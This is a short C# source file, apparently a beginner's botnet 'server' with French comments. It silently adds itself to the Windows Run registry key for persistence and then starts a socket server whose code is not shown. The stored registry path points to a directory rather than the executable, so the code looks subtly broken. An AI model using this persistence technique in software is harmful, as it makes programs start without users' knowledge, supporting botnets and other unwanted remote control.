using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using Microsoft.Win32;
using System.Net.Sockets;
//using System.Windows.Controls;
using System.Threading;
using System.IO;
using System.Reflection;
using Botnet;
//using System.Windows.Threading;

namespace Botnet    //espace de nom
{
    class Program   //une classe (dans une classe, il y a des fonctions)
    {
        static void Main(string[] args)  // c'est un main (fonction)
        {
            string path = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            Console.WriteLine(path);

            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(AppDomain.CurrentDomain.FriendlyName, path);


            Console.WriteLine("coucou je suis le serveur");     //Permet d'écrire sur le console
            Console.ReadKey();      //Va attendre une touchedu clavier pour lancer la suite (Read

            SocketServer sS  = new SocketServer();
            

        }



    }

}
